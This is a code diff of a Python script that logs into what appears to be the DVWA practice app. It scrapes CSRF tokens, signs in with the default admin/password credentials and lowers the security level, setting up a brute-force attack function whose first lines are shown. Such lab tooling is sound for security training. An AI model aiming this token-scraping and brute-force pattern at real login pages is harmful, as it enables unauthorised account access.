@@ -36,27 +36,36 @@ headers = {
 }
 
 def login_and_setup_security():
-    #response = session.get(login_url)
-    data = {
+    login_response = session.get(login_url)  
+    soup = BeautifulSoup(login_response.text, 'html.parser')
+    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
+
+    login_data = {
         'username': 'admin',
         'password': 'password',
         'Login': 'Login',
+        'user_token': user_token  
     }
-    response = session.post(login_url, data=data, headers=headers)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None
-    time.sleep(delay) 
-    print("Login response status:", response.status_code)
-    #response = session.get(security_url)
-    data = {
+    login_response = session.post(login_url, data=login_data, headers=headers)
+    
+    
+    if 'PHPSESSID' in session.cookies:
+        print("Login successful, PHPSESSID:", session.cookies['PHPSESSID'])
+    else:
+        print("Login failed")
+        return
+
+    
+    security_response = session.get(security_url)
+    soup = BeautifulSoup(security_response.text, 'html.parser')
+    security_token = soup.find('input', {'name': 'user_token'}).get('value')
+    security_data = {
         'security': 'low',
         'seclev_submit': 'Submit',
-        'user_token': user_token
+        'user_token': security_token
     }
-    session.post(security_url, data=data, headers=headers)
-    time.sleep(delay) 
+    session.post(security_url, data=security_data, headers=headers)
     
-    print("Security low mode response status:", response.status_code)
 def brute_force_attack():
     results = []
     total_tests = 0
